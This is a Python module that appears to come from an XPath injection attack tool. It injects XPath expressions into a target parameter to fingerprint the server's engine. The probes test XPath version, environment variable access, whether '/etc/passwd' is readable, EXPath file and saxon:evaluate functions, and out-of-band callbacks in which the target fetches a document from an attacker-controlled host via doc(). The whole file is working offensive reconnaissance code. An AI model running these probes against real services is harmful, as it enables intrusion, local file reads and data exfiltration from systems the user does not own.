import asyncio
from collections.abc import Callable
from typing import NamedTuple

from xpath import E, Expression, func, Functions

from .attack import AttackContext, check
from .injections import Injection
from .algorithms import ASCII_SEARCH_SPACE

fs_func = Functions('Q{http://expath.org/ns/file}')
saxon_func = Functions('saxon:')


class Feature(NamedTuple):
    name: str
    tests: list[Expression | Callable]


def test_oob(path):
    async def test_oob_inner(context: AttackContext, injector: Injection):
        if not context.oob_details:
            return False

        async with context.start_oob_server() as ctx:
            doc_expr = func.doc(f'{ctx.oob_host}{path}').add_path('/data') == ctx.oob_app['test_response_value']
            return await check(
                context,
                injector(context.target_parameter_value, doc_expr)
            )

    return test_oob_inner


features = [
    Feature('xpath-2',
            [
                func.lower_case('A') == 'a',
                func.ends_with('thetest', 'test'),
                func.encode_for_uri('test') == 'test'
            ]),
    Feature('xpath-3',
            [
                func.boolean(func.generate_id(E('/')))
            ]),
    Feature('xpath-3.1',
            [
                func.contains_token('a', 'a')
            ]),
    Feature('normalize-space',
            [
                func.normalize_space('  a  b ') == 'a b'
            ]),
    Feature('substring-search',
            [
                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'h')) == ASCII_SEARCH_SPACE.find('h'),
                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'o')) == ASCII_SEARCH_SPACE.find('o')
            ]),
    Feature('codepoint-search',
            [
                func.string_to_codepoints("test")[1] == 116
            ]),
    Feature('environment-variables',
            [
                func.exists(func.available_environment_variables())
            ]),
    Feature('document-uri',
            [
                func.document_uri(E('/'))
            ]),
    Feature('base-uri',
            [
                func.base_uri()
            ]),
    Feature('current-datetime',
            [
                func.string(func.current_dateTime())
            ]),
    Feature('unparsed-text',
            [
                func.unparsed_text_available(func.document_uri(E('/')))
            ]),
    Feature('doc-function',
            [
                func.doc_available(func.document_uri(E('/')))
            ]),
    Feature('linux',
            [
                func.unparsed_text_available('/etc/passwd')
            ]),
    Feature('expath-file',
            [
                func.string_length(fs_func.current_dir()) > 0
            ]),
    Feature('saxon',
            [
                saxon_func.evaluate('1+1') == 2
            ]),
    Feature('oob-http', [test_oob('/test/data')]),
    Feature('oob-entity-injection', [test_oob('/test/entity')])
]


async def detect_features(context: AttackContext, injector: Injection) -> list[Feature]:
    returner = []

    for feature in features:
        futures = []
        for test in feature.tests:
            if callable(test):
                futures.append(test(context, injector))
            elif context.injection:
                # Injection is set (e.g. time-based mode): pass raw expression
                # to check(), which handles injection wrapping + delay
                futures.append(check(context, test))
            else:
                # No injection set: pre-format through injector
                futures.append(check(context, injector(context.target_parameter_value, test)))
        checks = await asyncio.gather(*futures)

        returner.append((feature, all(checks)))

    return returner
